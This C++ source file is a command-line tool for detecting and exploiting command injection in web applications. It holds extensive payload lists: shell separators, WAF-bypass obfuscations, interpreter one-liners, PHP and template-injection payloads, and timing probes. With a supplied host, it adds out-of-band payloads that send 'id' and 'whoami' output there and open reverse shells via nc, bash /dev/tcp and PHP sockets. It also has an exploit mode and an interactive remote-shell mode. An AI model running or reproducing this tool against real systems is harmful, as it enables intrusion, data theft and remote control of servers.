#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <fstream>
#include <regex>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <functional>
#include <condition_variable>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <algorithm>
#include <iomanip>

using namespace std;

const string ECHO_MARKER = "HACKIT_RCE_MARKER_1749";
const string VERSION = "2.0.0";

struct Result {
    bool vulnerable;
    string url;
    string parameter;
    string method;
    string payload;
    string command;
    string output;
    double confidence;
    string engine;
    string technique;
};

struct Args {
    string url;
    string cmd;
    string data;
    string param;
    string method = "GET";
    string proxy;
    string cookie;
    string ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36";
    string oob;
    string tech;
    vector<string> headers;
    int timeout = 10;
    int threads = 20;
    int delay = 0;
    int retries = 1;
    bool detect = false;
    bool exploit = false;
    bool blind = false;
    bool all = false;
    bool json = false;
    bool verbose = false;
    bool shell = false;
};

class HTTPClient {
public:
    HTTPClient(const Args& a) : args(a) {}

    pair<string, long long> sendRequest(const string& targetUrl, const string& bodyData) {
        string host, path, query;
        int port = 80;

        string u = targetUrl;
        size_t prot = u.find("https://");
        bool useSSL = false;
        if (prot == 0) { useSSL = true; port = 443; u = u.substr(8); }
        else if (u.find("http://") == 0) u = u.substr(7);

        size_t slashPos = u.find('/');
        if (slashPos != string::npos) {
            path = u.substr(slashPos);
            host = u.substr(0, slashPos);
        } else {
            path = "/";
            host = u;
        }

        size_t colonPos = host.find(':');
        if (colonPos != string::npos) {
            port = stoi(host.substr(colonPos + 1));
            host = host.substr(0, colonPos);
        }

        auto start = chrono::steady_clock::now();

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return {"", 0};

        struct hostent* server = gethostbyname(host.c_str());
        if (!server) { close(sock); return {"", 0}; }

        struct sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        memcpy(&serverAddr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
        serverAddr.sin_port = htons(port);

        struct timeval tv;
        tv.tv_sec = args.timeout;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            close(sock); return {"", 0};
        }

        string req;
        if (args.method == "POST" || !bodyData.empty()) {
            req = "POST " + path + " HTTP/1.1\r\n";
            req += "Host: " + host + "\r\n";
            req += "Content-Type: application/x-www-form-urlencoded\r\n";
        } else {
            req = "GET " + path + " HTTP/1.1\r\n";
        }

        req += "User-Agent: " + args.ua + "\r\n";
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        req += "Connection: close\r\n";
        if (!args.cookie.empty()) req += "Cookie: " + args.cookie + "\r\n";
        for (const auto& h : args.headers) req += h + "\r\n";
        req += "\r\n";
        if (!bodyData.empty()) req += bodyData;

        if (send(sock, req.c_str(), req.length(), 0) < 0) { close(sock); return {"", 0}; }

        string response;
        char buffer[8192];
        int bytes;
        while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[bytes] = '\0';
            response += buffer;
        }
        close(sock);

        auto end = chrono::steady_clock::now();
        auto elapsed = chrono::duration_cast<chrono::milliseconds>(end - start).count();

        size_t bodyStart = response.find("\r\n\r\n");
        if (bodyStart != string::npos) return {response.substr(bodyStart + 4), elapsed};
        return {response, elapsed};
    }

private:
    Args args;
};

string urlEncode(const string& s) {
    string r;
    for (char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') r += c;
        else if (c == ' ') r += '+';
        else { char buf[4]; snprintf(buf, 4, "%%%02X", (unsigned char)c); r += buf; }
    }
    return r;
}

string buildInjectionURL(const string& base, const string& param, const string& payload, string& outBody) {
    outBody.clear();
    size_t qPos = base.find('?');
    string base_no_query = (qPos != string::npos) ? base.substr(0, qPos) : base;
    string existingQuery = (qPos != string::npos) ? base.substr(qPos + 1) : "";

    vector<pair<string, string>> params;
    if (!existingQuery.empty()) {
        stringstream ss(existingQuery);
        string pair;
        while (getline(ss, pair, '&')) {
            size_t eq = pair.find('=');
            if (eq != string::npos) params.push_back({pair.substr(0, eq), pair.substr(eq + 1)});
            else params.push_back({pair, ""});
        }
    }

    bool found = false;
    for (auto& p : params) {
        if (p.first == param) { p.second = urlEncode(payload); found = true; break; }
    }
    if (!found) params.push_back({param, urlEncode(payload)});

    string newQuery;
    for (size_t i = 0; i < params.size(); i++) {
        if (i > 0) newQuery += "&";
        newQuery += params[i].first + "=" + params[i].second;
    }
    return base_no_query + "?" + newQuery;
}

vector<string> extractParams(const Args& args) {
    if (!args.param.empty()) return {args.param};
    vector<string> params;
    size_t qPos = args.url.find('?');
    if (qPos != string::npos) {
        string query = args.url.substr(qPos + 1);
        stringstream ss(query);
        string pair;
        while (getline(ss, pair, '&')) {
            size_t eq = pair.find('=');
            params.push_back(pair.substr(0, eq));
        }
    }
    if (!args.data.empty()) {
        stringstream ss(args.data);
        string pair;
        while (getline(ss, pair, '&')) {
            size_t eq = pair.find('=');
            string key = pair.substr(0, eq);
            if (find(params.begin(), params.end(), key) == params.end()) params.push_back(key);
        }
    }
    if (params.empty() || args.all) {
        vector<string> defaults = {
            "q","id","cmd","exec","command","url","host","file","input","search",
            "c","code","lang","debug","action","process","run","system","shell",
            "page","dir","folder","path","cat","read","include","require","open",
            "doc","document","template","view","load","import","config","setting",
            "option","opt","key","token","pass","password","user","username","email"
        };
        if (params.empty()) params = defaults;
        else if (args.all) {
            for (const auto& d : defaults)
                if (find(params.begin(), params.end(), d) == params.end()) params.push_back(d);
        }
    }
    return params;
}

string getEchoCmd() { return "echo " + ECHO_MARKER; }

class ThreadPool {
public:
    ThreadPool(int num) : stop(false) {
        for (int i = 0; i < num; i++)
            workers.emplace_back([this] {
                while (true) {
                    function<void()> task;
                    {
                        unique_lock<mutex> lock(qmutex);
                        cv.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
    }
    ~ThreadPool() {
        {
            unique_lock<mutex> lock(qmutex);
            stop = true;
        }
        cv.notify_all();
        for (auto& w : workers) w.join();
    }
    template<class F> void enqueue(F&& f) {
        {
            unique_lock<mutex> lock(qmutex);
            tasks.emplace(forward<F>(f));
        }
        cv.notify_one();
    }

private:
    vector<thread> workers;
    queue<function<void()>> tasks;
    mutex qmutex;
    condition_variable cv;
    bool stop;
};

struct TestPayload {
    string payload;
    string technique;
    int sleepTime;
    string echoStr;
    string category;
};

vector<TestPayload> buildPayloads(const Args& args) {
    vector<TestPayload> payloads;
    string mark = ECHO_MARKER;
    string echo = getEchoCmd();

    if (!args.blind) {
        // ===== OUTPUT-BASED (35+ wrappers) =====
        vector<string> wrappers = {
            ";" + echo + ";", "|" + echo + "|", "`" + echo + "`",
            "$(" + echo + ")", "&" + echo + "&",
            "%0a" + echo + "%0a", "%0d%0a" + echo + "%0d%0a",
            "\\n" + echo + "\\n", "\\r\\n" + echo + "\\r\\n",
            "%09" + echo + "%09", "%00" + echo + "%00",
            "';" + echo + ";'", "\";" + echo + ";\"",
            "${" + echo + "}",
            "';\"' " + echo + " ';\";'", "\"';" + echo + ";'\"",
            "'\\\";" + echo + ";\"\\'", "\"\\';" + echo + ";'\\\"",
            ";" + echo + " #", "|" + echo + " #", "`" + echo + "` #", "$(" + echo + ") #",
            ";" + echo + " %23", ";" + echo + " <!--", ";" + echo + " /*", ";" + echo + " --",
            "|cmd /c " + echo + " |", ";cmd /c " + echo + " ;", "&cmd /c " + echo + " &",
            "&powershell -c \"" + echo + "\" &", ";powershell -c \"" + echo + "\" ;",
            "|powershell -c \"" + echo + "\" |",
            ";" + echo + ";echo DONE;", "&&" + echo + "&&", "||" + echo + "||",
            ";" + echo + "||echo FAIL;"
        };
        for (const auto& w : wrappers)
            payloads.push_back({w, "output-based", 0, mark, "output"});

        // ===== WAF BYPASS (40+ bypasses) =====
        vector<string> waf = {
            ";e`cho` " + mark + ";", ";e$(cho) " + mark + ";",
            "';'e'c'h'o' '" + mark + "';'", ";e\\c\\h\\o " + mark + ";",
            ";e''cho " + mark + ";", ";e\"\"cho " + mark + ";",
            ";ech$()o " + mark + ";", ";e\"$@\"cho " + mark + ";",
            ";e\"$*\"cho " + mark + ";", ";e${x}cho " + mark + ";",
            ";prin\\ntf '" + mark + "\\n' " + mark + ";",
            ";/???/echo " + mark + ";", ";/bi?/echo " + mark + ";",
            ";/usr/bin/ech? " + mark + ";",
            ";EcHo " + mark + ";", ";ECHO " + mark + ";", ";eChO " + mark + ";",
            ";echo " + mark + " | base64 -d|bash;",
            ";echo " + mark + " | base64 --decode|sh;",
            ";python3 -c \"import base64;exec(base64.b64decode('" + mark + "'))\";",
            ";perl -e \"use MIME::Base64;print decode_base64('" + mark + "')\";",
            ";echo " + mark + " | tr 'A-Za-z' 'N-ZA-Mn-za-m'|bash;",
            ";bash -c \"echo $'" + mark + "'\"|bash;",
            ";${PATH:0:1}cho $HOME;",
            "%253b" + echo + "%253b", "%25253b" + echo + "%25253b",
            ";echo\\t" + mark + ";",
            ";e\\fcho " + mark + ";", ";e\\rcho " + mark + ";",
            ";exec echo H4CK1T;",
            ";source /dev/stdin <<< \"echo H4CK1T\";"
        };
        for (const auto& w : waf)
            payloads.push_back({w, "output-waf", 0, mark, "output"});

        // ===== SHELL VARIANTS (20+ interpreters) =====
        vector<string> shellVariants = {
            ";perl -e 'print \"" + mark + "\"' ;",
            ";python3 -c 'print(\"" + mark + "\")' ;",
            ";python -c 'print(\"" + mark + "\")' ;",
            ";ruby -e 'puts \"" + mark + "\"' ;",
            ";php -r 'echo \"" + mark + "\";' ;",
            ";node -e 'console.log(\"" + mark + "\")' ;",
            ";lua -e 'print(\"" + mark + "\")' ;",
            ";awk 'BEGIN{print \"" + mark + "\"}' ;",
            ";tclsh -c 'puts \"" + mark + "\"' ;",
            ";groovy -e 'println \"" + mark + "\"' ;",
            ";zsh -c 'echo " + mark + "' ;",
            ";dash -c 'echo " + mark + "' ;",
            ";ksh -c 'echo " + mark + "' ;",
            ";csh -c 'echo " + mark + "' ;",
            ";irb -e 'puts \"" + mark + "\"' ;",
            ";psql -c \"SELECT '" + mark + "'\" ;",
            ";mysql -e \"SELECT '" + mark + "'\" ;",
            ";sqlite3 :memory: \"SELECT '" + mark + "'\" ;",
            ";gdb -batch -ex 'print \"" + mark + "\"' -ex quit;"
        };
        for (const auto& w : shellVariants)
            payloads.push_back({w, "output-shell", 0, mark, "output"});

        // ===== PHP TECH-SPECIFIC (10+ payloads) =====
        if (!args.tech.empty() && args.tech == "php") {
            vector<string> phpP = {
                "<?php echo '" + mark + "'; ?>",
                "<?= '" + mark + "' ?>",
                "<?php system('echo " + mark + "'); ?>",
                "<?php exec('echo " + mark + "',$o);print(implode(\"\\n\",$o)); ?>",
                "<?php shell_exec('echo " + mark + "'); ?>",
                "<?php passthru('echo " + mark + "'); ?>",
                "<?php $a=array(0=>'" + mark + "');echo implode($a); ?>",
                "<?php eval('echo \"" + mark + "\";'); ?>",
                "<?php assert('print \"" + mark + "\"'); ?>",
                "<?php preg_replace('/.*/e','print \"" + mark + "\"',''); ?>",
                "<?php $_='" + mark + "';echo$_; ?>"
            };
            for (const auto& p : phpP)
                payloads.push_back({p, "output-php", 0, mark, "output"});
        }

        // ===== SSTI (15+ template injection payloads) =====
        vector<string> sstiP = {
            // Twig
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}",
            // Jinja2
            "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
            // Freemarker
            "${7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('echo H4CK1T')}",
            // Velocity
            "#set($x=7*7)$x",
            "#set($e=\"e\")#set($x=$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('echo H4CK1T'))",
            // Jade
            "#{7*7}",
            // ERB
            "<%= 7*7 %>", "<%= system('echo H4CK1T') %>",
            // Tornado
            "{% import os %}{{os.system('echo H4CK1T')}}",
            // Smarty
            "{system('echo H4CK1T')}",
            // JSP EL
            "${7*7}"
        };
        for (const auto& p : sstiP)
            payloads.push_back({p, "ssti", 0, "", "output"});

        // ===== HEADER INJECTION (6+ payloads) =====
        vector<string> hdrP = {
            "\\necho H4CK1T\\n",
            "\\r\\necho H4CK1T\\r\\n",
            "'\\necho H4CK1T\\n'",
            "\"\\necho H4CK1T\\n\"",
            "%0aX-Custom:%20H4CK1T",
            "X-Forwarded-For: 127.0.0.1%0aX-Cmd:%20echo%20H4CK1T"
        };
        for (const auto& p : hdrP)
            payloads.push_back({p, "output-hdrinj", 0, "H4CK1T", "output"});
    }

    // ===== TIME-BASED (30+ payloads) =====
    vector<int> sleeps = {3, 5, 7, 10, 15};
    for (int s : sleeps) {
        vector<string> timeWrappers = {
            ";sleep(" + to_string(s) + ");", "|sleep(" + to_string(s) + ")|",
            "`sleep(" + to_string(s) + ")`", "$(sleep(" + to_string(s) + "))",
            "&sleep(" + to_string(s) + ")&",
            "';sleep(" + to_string(s) + ");'", "\";sleep(" + to_string(s) + ");\"",
            "${sleep(" + to_string(s) + ")}", "%0asleep(" + to_string(s) + ")%0a"
        };
        for (const auto& w : timeWrappers)
            payloads.push_back({w, "time-based", s, "", "time"});
    }
    // Ping-based timing
    for (int s : {3, 5, 10}) {
        payloads.push_back({";ping -c " + to_string(s) + " 127.0.0.1;", "time-based", s, "", "time"});
        payloads.push_back({";ping -n " + to_string(s) + " 127.0.0.1;", "time-based", s, "", "time"});
        payloads.push_back({"|ping -n " + to_string(s) + " 127.0.0.1|", "time-based", s, "", "time"});
        payloads.push_back({"&ping -c " + to_string(s) + " 127.0.0.1&", "time-based", s, "", "time"});
    }
    // Interpreter-based sleeps
    payloads.push_back({";python -c \"import time;time.sleep(5)\";", "time-based", 5, "", "time"});
    payloads.push_back({";perl -e \"sleep(5)\";", "time-based", 5, "", "time"});
    payloads.push_back({";ruby -e \"sleep(5)\";", "time-based", 5, "", "time"});
    payloads.push_back({";php -r \"sleep(5);\";", "time-based", 5, "", "time"});
    payloads.push_back({";node -e \"setTimeout(()=>{},5000)\";", "time-based", 5, "", "time"});
    payloads.push_back({";lua -e \"os.execute('sleep 5')\";", "time-based", 5, "", "time"});
    // Busy-loop / dd / openssl delays
    payloads.push_back({";timeout 5 bash -c 'while true;do true;done';", "time-based", 5, "", "time"});
    payloads.push_back({";dd if=/dev/zero bs=1M count=100 2>/dev/null;", "time-based", 5, "", "time"});
    payloads.push_back({";openssl speed -engine 2>&1 >/dev/null;", "time-based", 5, "", "time"});
    payloads.push_back({";sha1sum /dev/zero 2>&1 >/dev/null &;", "time-based", 3, "", "time"});
    payloads.push_back({";TIMEOUT /T 5 /NOBREAK;", "time-based", 5, "", "time"});
    payloads.push_back({"|TIMEOUT /T 5 /NOBREAK|", "time-based", 5, "", "time"});

    // ===== ERROR-BASED (15+ payloads) =====
    vector<string> errPayloads = {
        ";undefined_cmd_xyz_1749;", "|undefined_cmd_xyz_1749|",
        "$(undefined_cmd_xyz_1749)", "&undefined_cmd_xyz_1749&",
        "`undefined_cmd_xyz_1749`",
        ";cat /nonexistent_file_hackit_1749;", "|cat /nonexistent_file_hackit_1749|",
        ";type nonexistent_file_hackit_1749;",
        ";python -c \"1/0\";", ";perl -e \"1/0\";", ";php -r \"1/0;\";",
        ";ruby -e \"1/0\";",
        ";python -c \"a=[];print(a[99])\";",
        ";python -c \"import sys;sys.exit(1)\";",
        ";sh -c \"exit 1\";"
    };
    for (const auto& p : errPayloads)
        payloads.push_back({p, "error-based", 0, "", "error"});

    // ===== BLIND BOOLEAN (15+ payloads) =====
    if (args.blind) {
        vector<string> blindP = {
            ";if " + echo + "; then echo " + mark + "; fi;",
            "|if " + echo + "; then echo " + mark + "; fi|",
            ";" + echo + " && echo " + mark + ";",
            ";" + echo + " || echo " + mark + ";",
            "&" + echo + " && echo " + mark + "&",
            "';if " + echo + "; then echo " + mark + "; fi;'",
            "\";if " + echo + "; then echo " + mark + "; fi;\"",
            "$(if " + echo + "; then echo " + mark + "; fi)",
            "`if " + echo + "; then echo " + mark + "; fi`",
            "|" + echo + " && echo " + mark + " #",
            ";" + echo + " && echo " + mark + " #",
            "|" + echo + " || echo " + mark + " #",
            "%0a" + echo + " && echo " + mark + "%0a",
            ";test -f /etc/passwd && echo " + mark + ";",
            ";test -d /root && echo " + mark + ";",
            ";which python && echo " + mark + ";",
            ";which curl && echo " + mark + ";"
        };
        for (const auto& p : blindP)
            payloads.push_back({p, "blind-boolean", 0, mark, "blind"});
    }

    // ===== OOB (15+ payloads) =====
    if (!args.oob.empty()) {
        payloads.push_back({";curl -s http://" + args.oob + "/$(id|base64 -w0) &", "oob-http", 0, "", "oob"});
        payloads.push_back({"|curl -s http://" + args.oob + "/$(id|base64 -w0)|", "oob-http", 0, "", "oob"});
        payloads.push_back({";wget -q -O- http://" + args.oob + "/$(id|base64 -w0) &", "oob-http", 0, "", "oob"});
        payloads.push_back({";nslookup $(whoami)." + args.oob + " &", "oob-dns", 0, "", "oob"});
        payloads.push_back({";dig +short $(hostname)." + args.oob + " &", "oob-dns", 0, "", "oob"});
        payloads.push_back({";ping -c 1 $(id)." + args.oob + " &", "oob-dns", 0, "", "oob"});
        payloads.push_back({";python3 -c \"import urllib.request;urllib.request.urlopen('http://" + args.oob + "/'+__import__('base64').b64encode(__import__('os').popen('id').read().encode()).decode())\" &", "oob-http", 0, "", "oob"});
        payloads.push_back({";perl -e \"use LWP::Simple;getstore('http://" + args.oob + "/'.encode_base64('id'),'x')\" &", "oob-http", 0, "", "oob"});
        payloads.push_back({";nc -e /bin/sh " + args.oob + " 4444 &", "oob-rev", 0, "", "oob"});
        payloads.push_back({";bash -i >& /dev/tcp/" + args.oob + "/4444 0>&1 &", "oob-rev", 0, "", "oob"});
        payloads.push_back({"|bash -i >& /dev/tcp/" + args.oob + "/4444 0>&1|", "oob-rev", 0, "", "oob"});
        payloads.push_back({";php -r \"$sock=fsockopen('" + args.oob + "',4444);exec('/bin/sh -i <&3 >&3 2>&3');\" &", "oob-rev", 0, "", "oob"});
    }

    return payloads;
}

vector<Result> detectRCE(const Args& args) {
    HTTPClient client(args);
    vector<Result> results;
    vector<string> params = extractParams(args);
    vector<TestPayload> payloads = buildPayloads(args);
    mutex resultsMutex;

    {
        ThreadPool pool(args.threads);

        for (const string& param : params) {
            pool.enqueue([&, param]() {
                for (const auto& p : payloads) {
                    for (int r = 0; r < args.retries; r++) {
                        string bodyData;
                        string targetUrl = buildInjectionURL(args.url, param, p.payload, bodyData);
                        auto [body, elapsed] = client.sendRequest(targetUrl, args.data.empty() ? bodyData : args.data);

                        if (body.empty()) { if (args.delay > 0) this_thread::sleep_for(chrono::milliseconds(args.delay)); continue; }

                        bool vuln = false;
                        double conf = 0.0;
                        string output;

                        if (p.category == "output") {
                            if (!p.echoStr.empty() && body.find(p.echoStr) != string::npos) {
                                vuln = true;
                                conf = (p.technique == "output-waf") ? 0.93 : 0.95;
                                output = "Output-based RCE: marker '" + p.echoStr + "' reflected";
                            }
                            if (!vuln) {
                                vector<pair<regex, string>> patterns = {
                                    {regex(R"(\d+:\d+:\d+ up \d+)"), "uptime"},
                                    {regex(R"(uid=\d+\()"), "userid"},
                                    {regex(R"(Linux \S+ \d+\.\d+\.\d+)"), "kernel"},
                                    {regex(R"(total\s+\d+)"), "ls_output"},
                                    {regex(R"(root:\w+:0:0:)"), "passwd_entry"}
                                };
                                for (const auto& [re, label] : patterns) {
                                    if (regex_search(body, re)) {
                                        vuln = true; conf = 0.80;
                                        output = "Output-based RCE (regex): " + label;
                                        break;
                                    }
                                }
                            }
                        } else if (p.category == "time") {
                            long long minMs = p.sleepTime * 1000LL;
                            if (elapsed >= minMs && p.sleepTime > 0) {
                                vuln = true; conf = 0.85;
                                output = "Time delay: " + to_string(p.sleepTime) + "s (actual: " + to_string(elapsed) + "ms)";
                            }
                        } else if (p.category == "error") {
                            vector<string> indicators = {
                                "warning","error","unexpected","not found","command not found",
                                "stack trace","Fatal error","exception","Traceback","Parse error",
                                "syntax error","undefined","permission denied","cannot execute"
                            };
                            string bodyLow = body;
                            transform(bodyLow.begin(), bodyLow.end(), bodyLow.begin(), ::tolower);
                            for (const auto& ind : indicators) {
                                if (bodyLow.find(ind) != string::npos) {
                                    vuln = true; conf = 0.65;
                                    output = "Error indicator: " + ind;
                                    break;
                                }
                            }
                        } else if (p.category == "blind") {
                            if (!p.echoStr.empty() && body.find(p.echoStr) != string::npos) {
                                vuln = true; conf = 0.90;
                                output = "Blind boolean-based RCE";
                            }
                        } else if (p.category == "oob") {
                            vuln = false; conf = 0.0;
                            output = "OOB payload sent to " + args.oob;
                        }

                        if (vuln) {
                            lock_guard<mutex> lock(resultsMutex);
                            results.push_back({true, args.url, param, args.method, p.payload,
                                "", output, conf, "cpp", p.technique});
                            return;
                        }
                        if (args.delay > 0) this_thread::sleep_for(chrono::milliseconds(args.delay));
                    }
                }
            });
        }
    }

    if (results.empty())
        results.push_back({false, args.url, "", args.method, "", "", "No vulnerabilities found", 0.0, "cpp", "none"});
    return results;
}

vector<Result> exploitRCE(const Args& args) {
    HTTPClient client(args);
    vector<Result> results;
    vector<string> params = extractParams(args);
    string cmd = args.cmd.empty() ? "id" : args.cmd;

    vector<string> wrappers = {
        ";" + cmd + ";", "|" + cmd + "|", "`" + cmd + "`",
        "$(" + cmd + ")", "&" + cmd + "&",
        "';" + cmd + ";'", "\";" + cmd + ";\"",
        "${" + cmd + "}", "%0a" + cmd + "%0a",
        "%0d%0a" + cmd + "%0d%0a", "&&" + cmd + "&&", "||" + cmd + "||",
        "&" + cmd + " #", "|" + cmd + " #", ";" + cmd + " #",
        ";" + cmd + " %23", ";" + cmd + " <!--",
        "&cmd /c " + cmd + " &", ";powershell -c \"" + cmd + "\" ;",
        "|cmd /c " + cmd + " |", "|powershell -c \"" + cmd + "\" |"
    };

    for (const string& param : params) {
        for (const string& wrapper : wrappers) {
            string bodyData;
            string targetUrl = buildInjectionURL(args.url, param, wrapper, bodyData);
            auto [body, elapsed] = client.sendRequest(targetUrl, args.data.empty() ? bodyData : args.data);
            if (!body.empty()) {
                results.push_back({true, args.url, param, args.method, wrapper,
                    cmd, body.substr(0, 4096), 1.0, "cpp", "exploit"});
                break;
            }
        }
    }
    return results;
}

void shellMode(const Args& args) {
    HTTPClient client(args);
    vector<string> params = extractParams(args);

    cout << "[!] RCE SHELL ACTIVE — type 'exit' to quit" << endl;
    cout << "[!] Target: " << args.url << endl;
    cout << "[!] Engine: C++" << endl;
    cout << "[!] Parameters: ";
    for (size_t i = 0; i < params.size(); i++) {
        if (i > 0) cout << ", ";
        cout << params[i];
    }
    cout << endl;

    vector<string> wrappers = {
        ";%s;", "|%s|", "`%s`", "$(%s)", "&%s&",
        "';%s;'", "\";%s;\"", "${%s}", "%0a%s%0a",
        "%0d%0a%s%0d%0a", "&&%s&&", "||%s||",
        "&%s #", "|%s #", ";%s #",
        "&cmd /c %s &", ";powershell -c \"%s\" ;"
    };

    string input;
    while (true) {
        cout << "$ ";
        getline(cin, input);
        if (input == "exit" || input == "quit") break;
        if (input.empty()) continue;

        for (const string& param : params) {
            for (const string& wrapper : wrappers) {
                char payload[4096];
                snprintf(payload, sizeof(payload), wrapper.c_str(), input.c_str());
                string bodyData;
                string targetUrl = buildInjectionURL(args.url, param, payload, bodyData);
                auto [body, elapsed] = client.sendRequest(targetUrl, args.data.empty() ? bodyData : args.data);
                if (!body.empty()) {
                    body.erase(remove(body.begin(), body.end(), '\r'), body.end());
                    if (!body.empty() && body.back() == '\n') body.pop_back();
                    cout << body << endl;
                    goto next_cmd;
                }
            }
        }
        next_cmd:;
    }
    cout << "[!] Shell closed" << endl;
}

void printResults(const vector<Result>& results, bool json) {
    if (json) {
        cout << "[";
        for (size_t i = 0; i < results.size(); i++) {
            if (i > 0) cout << ",";
            const auto& r = results[i];
            cout << "{\"vulnerable\":" << (r.vulnerable ? "true" : "false");
            cout << ",\"url\":\"" << r.url << "\"";
            cout << ",\"parameter\":\"" << r.parameter << "\"";
            cout << ",\"method\":\"" << r.method << "\"";
            cout << ",\"payload\":\"" << r.payload << "\"";
            cout << ",\"command\":\"" << r.command << "\"";
            cout << ",\"output\":\"" << r.output << "\"";
            cout << ",\"confidence\":" << r.confidence;
            cout << ",\"engine\":\"" << r.engine << "\"";
            cout << ",\"technique\":\"" << r.technique << "\"}";
        }
        cout << "]" << endl;
    } else {
        for (const auto& r : results) {
            if (r.vulnerable) {
                string out = r.output;
                replace(out.begin(), out.end(), '\n', ' ');
                if (out.length() > 200) out = out.substr(0, 200);
                cout << "VULNERABLE|" << r.url << "|" << r.parameter << "|" << r.technique
                     << "|" << r.confidence << "|" << out << endl;
            } else {
                cout << "SAFE|" << r.url << "|none|no_rce|0.0|Target appears secure" << endl;
            }
        }
        int vc = 0;
        for (const auto& r : results) if (r.vulnerable) vc++;
        if (vc > 0) cout << "SUMMARY|" << vc << " parameter(s) vulnerable|RCE CONFIRMED" << endl;
        else cout << "SUMMARY|0 vulnerabilities|Target secure" << endl;
    }
}

int main(int argc, char* argv[]) {
    Args args;
    for (int i = 1; i < argc; i++) {
        string arg = argv[i];
        if (arg == "-u" && i + 1 < argc) args.url = argv[++i];
        else if (arg == "-c" && i + 1 < argc) args.cmd = argv[++i];
        else if (arg == "-d" && i + 1 < argc) args.data = argv[++i];
        else if (arg == "-p" && i + 1 < argc) args.param = argv[++i];
        else if (arg == "-m" && i + 1 < argc) args.method = argv[++i];
        else if (arg == "--timeout" && i + 1 < argc) args.timeout = stoi(argv[++i]);
        else if (arg == "-t" && i + 1 < argc) args.threads = stoi(argv[++i]);
        else if (arg == "--proxy" && i + 1 < argc) args.proxy = argv[++i];
        else if (arg == "--cookie" && i + 1 < argc) args.cookie = argv[++i];
        else if (arg == "--ua" && i + 1 < argc) args.ua = argv[++i];
        else if (arg == "--oob" && i + 1 < argc) args.oob = argv[++i];
        else if (arg == "--tech" && i + 1 < argc) args.tech = argv[++i];
        else if (arg == "--delay" && i + 1 < argc) args.delay = stoi(argv[++i]);
        else if (arg == "--retries" && i + 1 < argc) args.retries = stoi(argv[++i]);
        else if (arg == "--header" && i + 1 < argc) args.headers.push_back(argv[++i]);
        else if (arg == "--detect") args.detect = true;
        else if (arg == "--exploit") args.exploit = true;
        else if (arg == "--blind") args.blind = true;
        else if (arg == "--all") args.all = true;
        else if (arg == "--json") args.json = true;
        else if (arg == "--verbose") args.verbose = true;
        else if (arg == "--shell") args.shell = true;
    }

    if (args.url.empty()) {
        cerr << "{\"error\":\"target URL required (-u flag)\"}" << endl;
        return 1;
    }

    if (args.shell) {
        shellMode(args);
        return 0;
    }

    vector<Result> results;
    if (args.exploit || !args.cmd.empty()) results = exploitRCE(args);
    else results = detectRCE(args);

    printResults(results, args.json);
    return 0;
}
